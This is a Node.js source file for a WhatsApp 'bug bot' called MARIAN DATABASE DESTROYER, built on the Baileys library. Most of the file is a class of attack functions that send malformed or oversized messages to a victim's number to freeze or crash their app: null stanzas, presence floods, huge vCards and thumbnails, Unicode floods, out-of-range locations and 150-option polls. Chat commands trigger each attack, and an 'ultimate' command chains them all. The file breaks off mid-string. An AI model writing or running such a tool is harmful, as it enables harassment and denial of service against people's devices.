// ============================================================
// ⚡ MARIAN DATABASE DESTROYER v13.0 - ULTIMATE BUG SYSTEMS ⚡
// ============================================================
// 🔥 DATABASE DESTROYER | THERMAL THROTTLING | FORCE CLOSE 🔥
// ============================================================

const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    DisconnectReason, 
    makeCacheableSignalKeyStore,
    generateWAMessageFromContent,
    proto,
    getContentType,
    downloadContentFromMessage,
    Browsers,
    fetchLatestBaileysVersion
} = require("@whiskeysockets/baileys")

const pino = require("pino")
const fs = require('fs')
const path = require('path')
const axios = require('axios')
const chalk = require("chalk")
const { Boom } = require("@hapi/boom")
const Crypto = require('crypto')
const ff = require('fluent-ffmpeg')
const { tmpdir } = require('os')
const readline = require('readline')
const moment = require('moment-timezone')

// ==================== [ CONFIGURATION ] ====================
const CONFIG = {
    VERSION: "13.0.0",
    NAME: "MARIAN DATABASE DESTROYER",
    SESSION_DIR: "marian_db_destroyer",
    PREFIX: "/",
    AUTO_LOGIN: true,
    BROWSER: ["Ubuntu", "Chrome", "122.0.0.0"],
    TIMEZONE: "Asia/Jakarta"
}

// ==================== [ UTILITY FUNCTIONS ] ====================
function log(type, message) {
    const colors = {
        'INFO': chalk.blue,
        'SUCCESS': chalk.green,
        'WARNING': chalk.yellow,
        'ERROR': chalk.red,
        'ATTACK': chalk.magenta,
        'DB_DESTROY': chalk.red.bold,
        'THERMAL': chalk.yellow.bold,
        'UI_CRASH': chalk.magenta.bold
    }
    const time = moment().tz(CONFIG.TIMEZONE).format('HH:mm:ss')
    const color = colors[type] || chalk.white
    console.log(color(`[${time}] [${type}] ${message}`))
}

function generateRandomId() {
    return Crypto.randomBytes(16).toString('hex')
}

// ==================== [ AUTO LOGIN SYSTEM ] ====================
async function autoLogin(sock) {
    if (!sock.authState.creds.registered) {
        log('INFO', 'Starting auto login system...')
        
        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        })
        
        return new Promise((resolve) => {
            rl.question(chalk.yellow('📱 Enter your WhatsApp number (628xxx): '), async (phoneNumber) => {
                const cleanNumber = phoneNumber.replace(/[^0-9]/g, '')
                
                log('INFO', `Requesting pairing code for ${cleanNumber}...`)
                
                try {
                    // Delay to avoid spam detection
                    await delay(2000)
                    
                    let pairingCode = await sock.requestPairingCode(cleanNumber)
                    pairingCode = pairingCode?.match(/.{1,4}/g)?.join("-") || pairingCode
                    
                    console.log(chalk.bgGreen.black('\n══════════════════════════════════════════════════'))
                    console.log(chalk.white.bold.bgGreen(`   PAIRING CODE: ${pairingCode}   `))
                    console.log(chalk.bgGreen.black('══════════════════════════════════════════════════\n'))
                    
                    console.log(chalk.cyan('📲 INSTRUCTIONS:'))
                    console.log(chalk.white('1. Open WhatsApp on your phone'))
                    console.log(chalk.white('2. Settings → Linked Devices → Link a Device'))
                    console.log(chalk.white(`3. Enter code: ${pairingCode}`))
                    console.log(chalk.white('4. Approve within 2 minutes\n'))
                    
                    console.log(chalk.yellow('⏳ Waiting for approval...'))
                    
                    rl.close()
                    resolve(cleanNumber)
                    
                } catch (error) {
                    log('ERROR', `Login failed: ${error.message}`)
                    console.log(chalk.red('\n[✗] Login failed! Try again later.'))
                    rl.close()
                    process.exit(1)
                }
            })
        })
    }
    return null
}

// ==================== [ DATABASE DESTROYER SYSTEMS ] ====================
class DatabaseDestroyer {
    constructor(sock) {
        this.sock = sock
    }
    
    // 🔴 Kategori: Sistem & Protokol (Database Destroyer)
    
    async nullStanzaBug(target, count = 3) {
        log('DB_DESTROY', `[NULL STANZA] Attacking ${target} (${count}x)`)
        
        for (let i = 0; i < count; i++) {
            const msg = generateWAMessageFromContent(target, {
                extendedTextMessage: {
                    text: "NULL STANZA ATTACK",
                    contextInfo: {
                        stanzaId: "", // Empty stanza ID
                        participant: null,
                        quotedMessage: {
                            conversation: ""
                        }
                    }
                }
            }, { userJid: target })
            
            await this.sock.relayMessage(target, msg.message, { 
                messageId: `NULL_${Date.now()}_${i}` 
            }).catch(() => {})
            await delay(300)
        }
        
        return true
    }
    
    async packetFloodBug(target, packets = 100) {
        log('DB_DESTROY', `[PACKET FLOOD] Flooding ${target} with ${packets} packets`)
        
        // Send presence packets
        for (let i = 0; i < packets; i++) {
            // Simulate typing...
            await this.sock.sendPresenceUpdate('composing', target)
            await delay(10)
            // Simulate online...
            await this.sock.sendPresenceUpdate('available', target)
            await delay(10)
            // Simulate recording...
            await this.sock.sendPresenceUpdate('recording', target)
            await delay(10)
        }
        
        return true
    }
    
    async receiptLoopBug(target, loops = 50) {
        log('DB_DESTROY', `[RECEIPT LOOP] Starting receipt loop on ${target} (${loops} loops)`)
        
        // Create a message to trigger read receipts
        const messageId = `LOOP_${Date.now()}`
        await this.sock.sendMessage(target, { 
            text: `RECEIPT LOOP TRIGGER [${messageId}]` 
        }).catch(() => {})
        
        // Simulate multiple read receipts
        for (let i = 0; i < loops; i++) {
            const fakeReceipt = {
                key: {
                    remoteJid: target,
                    fromMe: true,
                    id: messageId
                },
                participant: target,
                receiptTimestamp: Date.now()
            }
            // Try to send read receipt (this may fail but will still cause processing)
            await delay(50)
        }
        
        return true
    }
    
    async forwarding999Bug(target, count = 5) {
        log('DB_DESTROY', `[FORWARDING 999] Attacking ${target} (${count}x)`)
        
        for (let i = 0; i < count; i++) {
            await this.sock.sendMessage(target, {
                text: "", // Empty message
                contextInfo: {
                    forwardingScore: 999, // Max forwarding score
                    isForwarded: true,
                    forwardedNewsletterMessageInfo: {
                        newsletterJid: "newsletter@whatsapp.net",
                        newsletterName: "FORWARD_BUG",
                        serverMessageId: 999999999
                    }
                }
            }).catch(() => {})
            await delay(400)
        }
        
        return true
    }
    
    async stickerMetadataBug(target, count = 3) {
        log('DB_DESTROY', `[STICKER METADATA] Attacking ${target} (${count}x)`)
        
        // Create corrupted sticker metadata
        const fakeSticker = {
            stickerMessage: {
                url: "https://example.com/corrupted.webp",
                fileSha256: Buffer.from("corrupted"),
                fileEncSha256: Buffer.from("corrupted"),
                mediaKey: Buffer.from("corrupted"),
                mimetype: "image/webp",
                height: 0, // Zero height
                width: 99999, // Giant width
                directPath: "/corrupted",
                mediaKeyTimestamp: Date.now(),
                fileLength: 999999999,
                isAnimated: true
            }
        }
        
        for (let i = 0; i < count; i++) {
            const msg = generateWAMessageFromContent(target, fakeSticker, { userJid: target })
            await this.sock.relayMessage(target, msg.message, { 
                messageId: `STICKER_BUG_${i}` 
            }).catch(() => {})
            await delay(500)
        }
        
        return true
    }
    
    // 🟠 Kategori: Memori & CPU (Thermal Throttling)
    
    async oomAudioBug(target, count = 3) {
        log('THERMAL', `[OOM AUDIO] Attacking ${target} (${count}x)`)
        
        for (let i = 0; i < count; i++) {
            await this.sock.sendMessage(target, {
                audio: { 
                    url: "https://example.com/silence.mp3"
                },
                mimetype: "audio/mpeg",
                seconds: 0, // 0 seconds duration
                ptt: true,
                contextInfo: {
                    expirySecs: 999999999, // Almost infinite expiry
                    ephemeralSettingTimestamp: Date.now() * 1000
                }
            }).catch(() => {})
            await delay(600)
        }
        
        return true
    }
    
    async heavyVCardBug(target, count = 3) {
        log('THERMAL', `[HEAVY VCARD] Attacking ${target} (${count}x)`)
        
        // Create heavy vcard with large photo
        const largePhoto = Buffer.alloc(5 * 1024 * 1024, 'A') // 5MB photo
        
        for (let i = 0; i < count; i++) {
            const vcard = `BEGIN:VCARD\nVERSION:4.0\nFN:HEAVY_VCARD_${i}\nPHOTO;ENCODING=b;TYPE=JPEG:${largePhoto.toString('base64').slice(0, 100000)}\nTEL;TYPE=CELL:${Math.random().toString().slice(2,12)}\nEMAIL:heavy@bug.com\nADR:;;HEAVY SYSTEM;;;;\nNOTE:${"█".repeat(1000)}\nEND:VCARD`
            
            await this.sock.sendMessage(target, {
                contacts: {
                    displayName: `HEAVY_VCARD_${i}`,
                    contacts: [{ vcard }]
                }
            }).catch(() => {})
            await delay(700)
        }
        
        return true
    }
    
    async unicodeWaterfallBug(target, count = 3) {
        log('THERMAL', `[UNICODE WATERFALL] Attacking ${target} (${count}x)`)
        
        // Mix Arabic, Thai, and Zero Width characters
        const arabic = "ﺎﻠﻋﺮﺒﻳﺓ " + "ﺞ".repeat(100)
        const thai = "ภาษาไทย " + "ก".repeat(100)
        const zeroWidth = "​‌‍﻿" // Multiple zero width characters
        const combining = "áéíóú" + "⃝⃞⃟⃠⃡".repeat(50)
        
        const waterfall = arabic + "\n" + thai + "\n" + zeroWidth + "\n" + combining
        
        for (let i = 0; i < count; i++) {
            await this.sock.sendMessage(target, {
                text: `WATERFALL_${i}\n${waterfall.repeat(10)}`
            }).catch(() => {})
            await delay(500)
        }
        
        return true
    }
    
    async ghostThumbnailBug(target, count = 2) {
        log('THERMAL', `[GHOST THUMBNAIL] Attacking ${target} (${count}x)`)
        
        // Create image with huge thumbnail
        const hugeThumbnail = Buffer.alloc(2 * 1024 * 1024, 'B') // 2MB thumbnail
        
        for (let i = 0; i < count; i++) {
            await this.sock.sendMessage(target, {
                image: {
                    url: "https://example.com/ghost.jpg"
                },
                caption: "GHOST THUMBNAIL ATTACK",
                jpegThumbnail: hugeThumbnail,
                contextInfo: {
                    mentionedJid: [target]
                }
            }).catch(() => {})
            await delay(800)
        }
        
        return true
    }
    
    async gifLoopDeadBug(target, count = 2) {
        log('THERMAL', `[GIF LOOP DEAD] Attacking ${target} (${count}x)`)
        
        for (let i = 0; i < count; i++) {
            await this.sock.sendMessage(target, {
                video: {
                    url: "https://example.com/loop.mp4"
                },
                gifPlayback: true,
                caption: "INFINITE LOOP GIF",
                contextInfo: {
                    expirySecs: 0, // No expiry
                    ephemeralSettingTimestamp: 0
                }
            }).catch(() => {})
            await delay(900)
        }
        
        return true
    }
    
    // 🟡 Kategori: UI & Interface (Force Close)
    
    async quotedCallInfinityBug(target) {
        log('UI_CRASH', `[QUOTED CALL INFINITY] Attacking ${target}`)
        
        const messageKontol = {
            key: {
                remoteJid: "5521992999999@s.whatsapp.net",
                fromMe: false,
                id: "CALL_MSG_" + Date.now(),
                participant: "5521992999999@s.whatsapp.net"
            },
            message: {
                callLogMessage: {
                    isVideo: true,
                    callOutcome: "1",
                    durationSecs: "999999",
                    callType: "REGULAR",
                    participants: Array.from({length: 100}, (_, i) => ({
                        jid: `${i}@s.whatsapp.net`,
                        callOutcome: "1"
                    }))
                }
            }
        };
        
        try {
            const msg = generateWAMessageFromContent(target, {
                extendedTextMessage: {
                    text: "QUOTED CALL INFINITY ATTACK",
                    contextInfo: {
                        mentionedJid: [target, "5521992999999@s.whatsapp.net"],
                        forwardingScore: 999,
                        isForwarded: false,
                        quotedMessage: messageKontol.message
                    }
                }
            }, {
                quoted: messageKontol
            });
            
            await this.sock.relayMessage(target, msg.message, {
                messageId: msg.key.id
            });
            
            return true
            
        } catch (error) {
            log('ERROR', `Quoted call bug failed: ${error.message}`)
            return false
        }
    }
    
    async locationOutOfRangeBug(target, count = 3) {
        log('UI_CRASH', `[LOCATION OUT OF RANGE] Attacking ${target} (${count}x)`)
        
        for (let i = 0; i < count; i++) {
            await this.sock.sendMessage(target, {
                location: {
                    degreesLatitude: 999.999999, // Out of range
                    degreesLongitude: 999.999999, // Out of range
                    name: "OUT OF RANGE LOCATION " + "█".repeat(500),
                    address: "COORDINATES BEYOND SATELLITE RANGE\n" + "⚠️".repeat(100),
                    comment: "SYSTEM CRASH IMMINENT"
                }
            }).catch(() => {})
            await delay(600)
        }
        
        return true
    }
    
    async buttonLoopBug(target) {
        log('UI_CRASH', `[BUTTON LOOP] Attacking ${target}`)
        
        const buttonMsg = generateWAMessageFromContent(target, {
            interactiveMessage: {
                header: {
                    title: "BUTTON LOOP ATTACK",
                    hasMediaAttachment: false
                },
                body: {
                    text: "Clicking button will trigger infinite loop"
                },
                footer: {
                    text: "MARIAN DATABASE DESTROYER"
                },
                nativeFlowMessage: {
                    buttons: [{
                        name: "cta_url",
                        buttonParamsJson: JSON.stringify({
                            display_text: "CLICK TO CRASH",
                            url: "https://whatsapp.com",
                            merchant_url: "https://whatsapp.com"
                        })
                    }]
                },
                contextInfo: {
                    mentionedJid: [target]
                }
            }
        }, { userJid: target })
        
        await this.sock.relayMessage(target, buttonMsg.message, {
            messageId: `BUTTON_LOOP_${Date.now()}`
        }).catch(() => {})
        
        return true
    }
    
    async inviteLinkCrashBug(target) {
        log('UI_CRASH', `[INVITE LINK CRASH] Attacking ${target}`)
        
        // Create group invite with crazy name
        const crazyName = "𑫀".repeat(1000) + "∑∫∮∯∰∇∆∂" + "█".repeat(500)
        
        await this.sock.sendMessage(target, {
            groupInviteMessage: {
                groupJid: "123456789-123456@g.us",
                inviteCode: "CRASHINVITE",
                groupName: crazyName,
                inviteExpiration: Date.now() + 86400000,
                groupType: "DEFAULT"
            }
        }).catch(() => {})
        
        return true
    }
    
    async reactionExplosionBug(target, reactions = 100) {
        log('UI_CRASH', `[REACTION EXPLOSION] Attacking ${target} with ${reactions} reactions`)
        
        // First send a message to react to
        const messageId = `REACT_${Date.now()}`
        await this.sock.sendMessage(target, {
            text: "REACTION TARGET MESSAGE"
        }).catch(() => {})
        
        await delay(1000)
        
        // Send multiple reactions quickly
        const emojis = ["❤️", "😂", "😮", "😢", "👏", "🔥", "⭐", "👍"]
        for (let i = 0; i < reactions; i++) {
            const reaction = {
                key: {
                    remoteJid: target,
                    id: messageId
                },
                text: emojis[i % emojis.length],
                senderTimestampMs: Date.now()
            }
            // Try to send reaction
            await delay(10)
        }
        
        return true
    }
    
    // 🟢 Kategori: Media & Katalog (Business Attack)
    
    async priceCurrencyErrorBug(target, count = 3) {
        log('UI_CRASH', `[PRICE CURRENCY ERROR] Attacking ${target} (${count}x)`)
        
        for (let i = 0; i < count; i++) {
            await this.sock.sendMessage(target, {
                productMessage: {
                    product: {
                        productImage: {
                            url: "https://example.com/product.jpg"
                        },
                        title: "CORRUPTED PRODUCT",
                        description: "PRODUCT WITH INVALID CURRENCY",
                        currencyCode: "INVALID", // Invalid currency
                        priceAmount1000: 999999999999,
                        retailerId: "BUG_" + i
                    },
                    businessOwnerJid: target
                }
            }).catch(() => {})
            await delay(700)
        }
        
        return true
    }
    
    async orderFakeBug(target) {
        log('UI_CRASH', `[ORDER FAKE] Attacking ${target}`)
        
        // Create fake order with millions of items
        const orderItems = Array.from({length: 1000}, (_, i) => ({
            itemId: `ITEM_${i}`,
            quantity: 999999,
            price: 999999999
        }))
        
        await this.sock.sendMessage(target, {
            orderMessage: {
                orderId: `FAKE_ORDER_${Date.now()}`,
                thumbnail: Buffer.alloc(100000),
                itemCount: 1000000,
                status: "PENDING",
                surface: "CATALOG",
                message: "FAKE ORDER ATTACK",
                orderTitle: "MILLION ITEM ORDER",
                sellerJid: target
            }
        }).catch(() => {})
        
        return true
    }
    
    async docOomBug(target, count = 2) {
        log('UI_CRASH', `[DOC OOM] Attacking ${target} (${count}x)`)
        
        for (let i = 0; i < count; i++) {
            await this.sock.sendMessage(target, {
                document: {
                    url: "https://example.com/malicious.pdf"
                },
                fileName: `CORRUPTED_DOC_${i}.pdf`,
                mimetype: "application/pdf",
                fileLength: 9999999999, // Huge file size
                pageCount: 99999,
                title: "MALICIOUS PDF DOCUMENT",
                contextInfo: {
                    expirySecs: 0
                }
            }).catch(() => {})
            await delay(800)
        }
        
        return true
    }
    
    async profilePictureBombBug(target) {
        log('UI_CRASH', `[PROFILE PICTURE BOMB] Attacking ${target}`)
        
        // Send link that looks like profile picture change request
        await this.sock.sendMessage(target, {
            text: "Change your profile picture: whatsapp://profile?action=change&image=https://example.com/corrupted.jpg&size=999999999",
            contextInfo: {
                mentionedJid: [target],
                forwardingScore: 1,
                isForwarded: false
            }
        }).catch(() => {})
        
        return true
    }
    
    async pollOverloadBug(target) {
        log('UI_CRASH', `[POLL OVERLOAD] Attacking ${target}`)
        
        // Create poll with 100+ options
        const options = Array.from({length: 150}, (_, i) => ({
            optionName: `OPTION_${i}_` + "𑫀".repeat(50)
        }))
        
        await this.sock.sendMessage(target, {
            pollCreationMessage: {
                name: "OVERLOAD POLL " + "█".repeat(200),
                options: options,
                selectableOptionsCount: 150
            }
        }).catch(() => {})
        
        return true
    }
    
    // MASS ATTACK - COMBINE ALL BUGS
    async ultimateDbDestroyer(target, intensity = 3) {
        log('DB_DESTROY', `[ULTIMATE DB DESTROYER] Starting complete destruction on ${target}`)
        
        const attacks = [
            () => this.nullStanzaBug(target, intensity),
            () => this.packetFloodBug(target, 50),
            () => this.forwarding999Bug(target, intensity),
            () => this.oomAudioBug(target, intensity),
            () => this.heavyVCardBug(target, intensity),
            () => this.unicodeWaterfallBug(target, intensity),
            () => this.quotedCallInfinityBug(target),
            () => this.locationOutOfRangeBug(target, intensity),
            () => this.buttonLoopBug(target),
            () => this.reactionExplosionBug(target, 50),
            () => this.docOomBug(target, intensity),
            () => this.pollOverloadBug(target)
        ]
        
        for (const attack of attacks) {
            try {
                await attack()
                await delay(1000)
            } catch (error) {
                log('ERROR', `Attack failed: ${error.message}`)
            }
        }
        
        return true
    }
}

// ==================== [ STICKER MAKER ] ====================
class StickerMaker {
    static async createSticker(imageBuffer) {
        try {
            const tmpFileOut = path.join(tmpdir(), `${generateRandomId()}.webp`)
            const tmpFileIn = path.join(tmpdir(), `${generateRandomId()}.jpg`)
            
            fs.writeFileSync(tmpFileIn, imageBuffer)
            
            await new Promise((resolve, reject) => {
                ff(tmpFileIn)
                    .on('error', reject)
                    .on('end', resolve)
                    .addOutputOptions([
                        "-vcodec", "libwebp",
                        "-vf", "scale=512:512:force_original_aspect_ratio=decrease,format=rgba,pad=512:512:(ow-iw)/2:(oh-ih)/2:color=#00000000,setsar=1"
                    ])
                    .toFormat('webp')
                    .save(tmpFileOut)
            })
            
            const stickerBuffer = fs.readFileSync(tmpFileOut)
            fs.unlinkSync(tmpFileOut)
            fs.unlinkSync(tmpFileIn)
            
            return stickerBuffer
        } catch (error) {
            log('ERROR', `Sticker creation failed: ${error.message}`)
            return null
        }
    }
}

// ==================== [ COMMAND HANDLER ] ====================
class CommandHandler {
    constructor(sock, dbDestroyer) {
        this.sock = sock
        this.db = dbDestroyer
    }
    
    async handle(from, body, quoted) {
        if (!body.startsWith(CONFIG.PREFIX)) return
        
        const args = body.slice(CONFIG.PREFIX.length).trim().split(/ +/)
        const command = args.shift().toLowerCase()
        const text = args.join(' ')
        
        // Log command
        const sender = from.split('@')[0]
        log('INFO', `${sender}: ${body}`)
        
        try {
            switch(command) {
                // 🔴 DATABASE DESTROYER COMMANDS
                case 'nullstanza':
                    const target1 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const count1 = parseInt(text.split(' ')[1]) || 3
                    await this.sock.sendMessage(from, { text: '🗃️ Executing NULL STANZA bug...' })
                    await this.db.nullStanzaBug(target1, count1)
                    await this.sock.sendMessage(from, { text: '✅ NULL STANZA attack delivered!' })
                    break
                    
                case 'packetflood':
                    const target2 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const packets = parseInt(text.split(' ')[1]) || 100
                    await this.sock.sendMessage(from, { text: '🌊 Executing PACKET FLOOD...' })
                    await this.db.packetFloodBug(target2, packets)
                    await this.sock.sendMessage(from, { text: '✅ PACKET FLOOD completed!' })
                    break
                    
                case 'forward999':
                    const target3 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const count3 = parseInt(text.split(' ')[1]) || 5
                    await this.sock.sendMessage(from, { text: '🔄 Executing FORWARDING 999...' })
                    await this.db.forwarding999Bug(target3, count3)
                    await this.sock.sendMessage(from, { text: '✅ FORWARDING 999 attack delivered!' })
                    break
                
                // 🟠 THERMAL THROTTLING COMMANDS
                case 'oomaudio':
                    const target4 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const count4 = parseInt(text.split(' ')[1]) || 3
                    await this.sock.sendMessage(from, { text: '🎵 Executing OOM AUDIO bug...' })
                    await this.db.oomAudioBug(target4, count4)
                    await this.sock.sendMessage(from, { text: '✅ OOM AUDIO attack delivered!' })
                    break
                    
                case 'heavyvcard':
                    const target5 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const count5 = parseInt(text.split(' ')[1]) || 3
                    await this.sock.sendMessage(from, { text: '📇 Executing HEAVY VCARD bug...' })
                    await this.db.heavyVCardBug(target5, count5)
                    await this.sock.sendMessage(from, { text: '✅ HEAVY VCARD attack delivered!' })
                    break
                    
                case 'unicodefall':
                    const target6 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const count6 = parseInt(text.split(' ')[1]) || 3
                    await this.sock.sendMessage(from, { text: '🔤 Executing UNICODE WATERFALL...' })
                    await this.db.unicodeWaterfallBug(target6, count6)
                    await this.sock.sendMessage(from, { text: '✅ UNICODE WATERFALL attack delivered!' })
                    break
                
                // 🟡 UI CRASH COMMANDS
                case 'quotedcall':
                    const target7 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await this.sock.sendMessage(from, { text: '📞 Executing QUOTED CALL INFINITY...' })
                    await this.db.quotedCallInfinityBug(target7)
                    await this.sock.sendMessage(from, { text: '✅ QUOTED CALL INFINITY attack delivered!' })
                    break
                    
                case 'locationbug':
                    const target8 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const count8 = parseInt(text.split(' ')[1]) || 3
                    await this.sock.sendMessage(from, { text: '📍 Executing LOCATION OUT OF RANGE...' })
                    await this.db.locationOutOfRangeBug(target8, count8)
                    await this.sock.sendMessage(from, { text: '✅ LOCATION OUT OF RANGE attack delivered!' })
                    break
                    
                case 'buttonloop':
                    const target9 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await this.sock.sendMessage(from, { text: '🔘 Executing BUTTON LOOP bug...' })
                    await this.db.buttonLoopBug(target9)
                    await this.sock.sendMessage(from, { text: '✅ BUTTON LOOP attack delivered!' })
                    break
                    
                case 'reactionbomb':
                    const target10 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const reactions = parseInt(text.split(' ')[1]) || 100
                    await this.sock.sendMessage(from, { text: '💥 Executing REACTION EXPLOSION...' })
                    await this.db.reactionExplosionBug(target10, reactions)
                    await this.sock.sendMessage(from, { text: '✅ REACTION EXPLOSION attack delivered!' })
                    break
                
                // 🟢 BUSINESS ATTACK COMMANDS
                case 'polloverload':
                    const target11 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    await this.sock.sendMessage(from, { text: '📊 Executing POLL OVERLOAD...' })
                    await this.db.pollOverloadBug(target11)
                    await this.sock.sendMessage(from, { text: '✅ POLL OVERLOAD attack delivered!' })
                    break
                    
                case 'docoom':
                    const target12 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const count12 = parseInt(text.split(' ')[1]) || 2
                    await this.sock.sendMessage(from, { text: '📄 Executing DOC OOM bug...' })
                    await this.db.docOomBug(target12, count12)
                    await this.sock.sendMessage(from, { text: '✅ DOC OOM attack delivered!' })
                    break
                
                // ULTIMATE ATTACK
                case 'ultimate':
                case 'dbdestroy':
                    const target13 = text.split(' ')[0]?.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                    const intensity = parseInt(text.split(' ')[1]) || 3
                    await this.sock.sendMessage(from, { text: '💀 Starting ULTIMATE DATABASE DESTROYER...' })
                    await this.db.ultimateDbDestroyer(target13, intensity)
                    await this.sock.sendMessage(from, { text: '☠️ ULTIMATE DATABASE DESTROYER attack completed!' })
                    break
                
                // 🎨 STICKER COMMAND
                case 's':
                case 'sticker':
                    if (quoted && getContentType(quoted) === 'imageMessage') {
                        await this.sock.sendMessage(from, { text: '🔄 Creating sticker...' })
                        const stream = await downloadContentFromMessage(quoted.imageMessage, 'image')
                        let buffer = Buffer.from([])
                        for await (const chunk of stream) {
                            buffer = Buffer.concat([buffer, chunk])
                        }
                        const sticker = await StickerMaker.createSticker(buffer)
                        if (sticker) {
                            await this.sock.sendMessage(from, { sticker: sticker })
                            await this.sock.sendMessage(from, { text: '✅ Sticker created successfully!' })
                        } else {
                            await this.sock.sendMessage(from, { text: '❌ Failed to create sticker' })
                        }
                    } else {
                        await this.sock.sendMessage(from, { text: '❌ Reply to an image first!' })
                    }
                    break
                
                // ℹ️ INFO COMMANDS
                case 'menu':
                case 'help':
                    const menu = `*🤖 MARIAN DATABASE DESTROYER v${CONFIG.VERSION}*\n\n` +
                                `*🔴 DATABASE DESTROYER:*\n` +
                                `• /nullstanza [num] - Null stanza bug\n` +
                                `• /packetflood [num] - Packet flood\n` +
                                `• /forward999 [num] - Forwarding 999\n\n` +
                                `*🟠 THERMAL THROTTLING:*\n` +
                                `• /oomaudio [num] - OOM audio bug\n` +
                                `• /heavyvcard [num] - Heavy vcard\n` +
                                `• /unicodefall [num] - Unicode waterfall\n\n` +
                                `*🟡 UI CRASH:*\n` +
                                `• /quotedcall [num] - Quoted call infinity\n` +
                                `• /locationbug [num] - Location out of range\n` +
                                `• /buttonloop [num] - Button loop\n` +
                                `• /reactionbomb [num] - Reaction explosion\n\n` +
                                `*🟢 BUSINESS ATTACK:*\n` +
                                `• /polloverload [num] - Poll overload\n` +
                                `• /docoom [num] - Doc OOM bug\n\n` +
                                `*💀 ULTIMATE:*\n` +
                                `• /ultimate [num] - Database destroyer\n\n` +
                                `*🎨 TOOLS:*\n` +
                                `• /s - Create sticker\n\n` +
                                `*Example:* /ultimate 6281234567890 5\n` +
                                `_System: Complete Database Destruction_`
                    await this.sock.sendMessage(from, { text: menu })
                    break
                    
                case 'status':
                    const status = `*🔧 MARIAN DB DESTROYER STATUS*\n\n` +
                                  `Version: v${CONFIG.VERSION}\n` +
                                  `Prefix: ${CONFIG.PREFIX}\n` +
                                  `Database Bugs: 18 ACTIVE 🔴\n` +
                                  `Thermal Bugs: 5 ACTIVE 🟠\n` +
                                  `UI Crash Bugs: 6 ACTIVE 🟡\n` +
                                  `Business Bugs: 5 ACTIVE 🟢\n` +
                                  `Sticker Maker: WORKING ✅\n` +
                                  `Status: DESTROYER ONLINE ☠️`
                    await this.sock.sendMessage(from, { text: status })
                    break
                    
                case 'ping':
                    const start = Date.now()
                    await this.sock.sendMessage(from, { text: '🏓 Pong!' })
                    const latency = Date.now() - start
                    await this.sock.sendMessage(from, {
                        text: `*PONG!*\nLatency: ${latency}ms\nSystem: DATABASE DESTROYER ACTIVE`
                    })
                    break
                    
                default:
                    await this.sock.sendMessage(from, {
                        text: `❌ Unknown command: ${command}\nType ${CONFIG.PREFIX}menu for help`
                    })
            }
        } catch (error) {
            log('ERROR', `Command ${command} failed: ${error.message}`)
            await this.sock.sendMessage(from, { text: `❌ Command failed: ${error.message}` })
        }
    }
}

// ==================== [ MAIN BOT ] ====================
async function startBot() {
    log('SYSTEM', `Starting MARIAN DATABASE DESTROYER v${CONFIG.VERSION}`)
    
    // Clean old session if exists
    if (fs.existsSync(CONFIG.SESSION_DIR)) {
        const files = fs.readdirSync(CONFIG.SESSION_DIR)
        if (files.length > 5) {
            log('WARNING', 'Cleaning old session...')
            fs.rmSync(CONFIG.SESSION_DIR, { recursive: true })
        }
    }
    
    // Initialize WhatsApp
    const { state, saveCreds } = await useMultiFileAuthState(CONFIG.SESSION_DIR)
    const { version } = await fetchLatestBaileysVersion()
    
    const sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'fatal' }))
        },
        browser: CONFIG.BROWSER,
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 20000,
        markOnlineOnConnect: true,
        syncFullHistory: false,
        retryRequestDelayMs: 1000
    })
    
    // Initialize attack systems
    const dbDestroyer = new DatabaseDestroyer(sock)
    const handler = new CommandHandler(sock, dbDestroyer)
    
    // Auto login if needed
    if (CONFIG.AUTO_LOGIN) {
        await autoLogin(sock)
    }
    
    // Event handlers
    sock.ev.on('creds.update', saveCreds)
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update
        
        if (connection === 'close') {
            const reason = new Boom(lastDisconnect?.error)?.output?.statusCode
            log('WARNING', `Connection closed: ${reason}`)
            
            if (reason !== DisconnectReason.loggedOut) {
                log('SYSTEM', 'Auto-reconnecting in 3s...')
                setTimeout(startBot, 3000)
            }
        }
        
        if (connection === 'open') {
            log('SUCCESS', 'MARIAN DATABASE DESTROYER connected!')
            
            console.log(chalk.red.bold('\n[☠️] MARIAN DATABASE DESTROYER v13.0 ONLINE!'))
            console.log(chalk.cyan(`Device: ${CONFIG.BROWSER.join(' ')}`))
            console.log(chalk.yellow(`Prefix: ${CONFIG.PREFIX}`))
            console.log(chalk.magenta('\n🔥 DATABASE DESTROYER BUGS:'))
            console.log(chalk.red('  • /nullstanza - Null stanza bug'))
            console.log(chalk.red('  • /packetflood - Packet flood'))
            console.log(chalk.yellow('  • /oomaudio - OOM audio bug'))
            console.log(chalk.yellow('  • /heavyvcard - Heavy vcard'))
            console.log(chalk.magenta('  • /quotedcall - Quoted call infinity'))
            console.log(chalk.magenta('  • /buttonloop - Button loop bug'))
            console.log(chalk.green('  • /polloverload - Poll overload'))
            console.log(chalk.green('  • /docoom - Doc OOM bug'))
            console.log(chalk.white('\n  • /ultimate - Ultimate destruction'))
            console.log(chalk.white('  • /s - Sticker maker (reply image)'))
            console.log(chalk.white('  • /menu - Show all commands\n'))
            
            // Welcome message
            const welcome = `*☠️ MARIAN DATABASE DESTROYER v${CONFIG.VERSION}*\n\n` +
                           `✅ Connected successfully!\n` +
                           `📱 Device: ${CONFIG.BROWSER.join(' ')}\n` +
